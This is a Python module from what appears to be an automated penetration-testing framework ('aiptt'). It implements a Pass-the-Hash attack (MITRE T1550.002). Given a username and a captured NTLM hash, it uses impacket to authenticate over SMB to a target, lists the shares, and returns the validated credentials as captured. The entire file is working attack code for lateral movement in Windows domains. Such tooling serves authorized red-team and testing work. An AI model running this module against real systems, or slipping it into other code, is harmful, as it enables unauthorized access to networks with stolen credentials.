"""
Pass-the-Hash module.

FR-ATK-05 | MITRE T1550.002
Authenticates to SMB/WMI using captured NTLM hashes (no password cracking needed).
"""

from __future__ import annotations

from aiptt.attacks.base import AbstractAttackModule, AttackResult


class Module(AbstractAttackModule):
    module_id       = "AD-PTH-001"
    mitre_technique = "T1550.002"
    destructive     = False
    sandboxable     = True

    def execute(self, target: str, parameters: dict) -> AttackResult:
        dc_ip    = parameters.get("dc_ip", target)
        domain   = parameters.get("domain", "")
        username = parameters.get("username", "")
        lm_hash  = parameters.get("lm_hash", "aad3b435b51404eeaad3b435b51404ee")
        nt_hash  = parameters.get("nt_hash", "")

        if not nt_hash or not username:
            return AttackResult(False, "MISSING_PARAMS", False, "none",
                                "username and nt_hash are required")

        try:
            from impacket.smbconnection import SMBConnection  # type: ignore

            smb = SMBConnection(target, dc_ip)
            smb.login(username, "", domain, lm_hash, nt_hash)

            shares = smb.listShares()
            share_names = [s["shi1_netname"][:-1] for s in shares]

            smb.logoff()

            return AttackResult(
                success=True,
                outcome="SUCCESS",
                gained_access=True,
                access_level="user",
                output=f"SMB authenticated via PTH as {domain}\\{username}. "
                       f"Shares: {share_names}",
                credentials_captured=[
                    {
                        "type":     "validated_ntlm",
                        "username": username,
                        "domain":   domain,
                        "target":   target,
                    }
                ],
            )

        except ImportError:
            return AttackResult(False, "IMPACKET_MISSING", False, "none",
                                "impacket is not installed")
        except Exception as e:
            error_str = str(e)
            if "STATUS_LOGON_FAILURE" in error_str:
                return AttackResult(False, "LOGON_FAILURE", False, "none",
                                    f"PTH failed: {error_str}")
            return AttackResult(False, "ERROR", False, "none", error_str)
